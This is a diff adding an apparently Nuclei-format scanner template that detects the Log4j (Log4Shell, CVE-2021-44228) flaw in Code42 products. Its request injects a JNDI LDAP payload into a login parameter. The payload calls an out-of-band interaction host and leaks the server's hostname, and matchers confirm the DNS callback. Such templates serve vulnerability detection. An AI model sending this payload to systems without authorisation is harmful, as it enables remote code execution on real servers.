@@ -1,0 +1,48 @@
+id: code42-log4j-rce
+
+info:
+  name: Apache Code42 -  Log4j Remote Code Execution
+  author: Adam Crosser
+  severity: critical
+  description: |
+    Multiple Code42 components are impacted by the logj4 vulnerability. Affected Code42 components include:
+    - Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022
+    - Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans: Updated Log4j from 2.16.0 to 2.17.1 on January 18, 2022
+    - Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February 2, 2022
+    - On-premises Code42 server: Mitigated from Log4j vulnerabilities by following these steps
+    - On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021
+  reference:
+    - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: jndi,log4j,rce,cve,cve2021,oast,code42
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&url=https://localhost'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
+
+# Enhanced by mp on 2022/05/27
